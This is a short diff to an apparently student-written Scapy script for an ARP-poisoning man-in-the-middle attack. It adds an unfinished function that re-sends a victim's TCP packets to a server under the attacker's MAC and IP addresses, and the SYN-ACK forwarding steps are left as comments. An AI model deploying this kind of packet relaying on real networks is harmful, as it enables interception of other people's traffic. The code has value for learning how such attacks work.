@@ -70,4 +70,28 @@ def arp_poisonening(victim_ip, server_ip):
         stop_attack(server_ip, victim_ip, server_mac, victim_mac)
 
 
+## Try to do de syn-ack response poging 5
+# 
+def three_way_handshake(pkt, attackerMac, attackerIP, serverMac, serverIP):
+    # Forward SYN packet from victem to server, adjust packet to make the server think this is the victim
+    ether = sc.Ether(src=attackerMac, dst=serverMac)
+    ip = sc.IP(src=attackerIP, dst=serverIP)
+    tcp = sc.TCP(
+        sport=pkt[sc.TCP].sport,
+        dport=pkt[sc.TCP].dport,
+        seq=pkt[sc.TCP].seq,
+        ack=pkt[sc.TCP].ack,
+        flags=pkt[sc.TCP].flags
+    )
+    if pkt.haslayer(sc.Raw):
+        raw = sc.Raw(load=pkt[sc.Raw].load)
+        new_pkt = ether / ip / tcp / raw
+    else:
+        new_pkt = ether / ip / tcp
+    sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)
+
+    # Sniff for SYN-ACK from server
+
+
+    # Forward adjusted SYN-ACK to victim
 
